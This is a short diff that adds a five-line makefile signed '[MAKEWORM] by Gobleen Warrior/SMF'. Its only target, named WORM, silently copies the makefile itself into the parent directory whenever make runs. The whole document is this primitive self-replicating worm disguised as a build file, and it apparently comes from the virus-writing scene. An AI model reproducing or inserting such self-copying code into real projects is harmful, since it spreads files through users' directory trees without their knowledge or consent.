@@ -1,0 +1,5 @@
+   ME = MAKEFILE
+   WORM :
+    @IF EXIST $(ME).MAK COPY $(ME).MAK ..\. >NUL
+    @IF EXIST $(ME) COPY $(ME) ..\. >NUL
+   # [MAKEWORM] by Gobleen Warrior/SMF
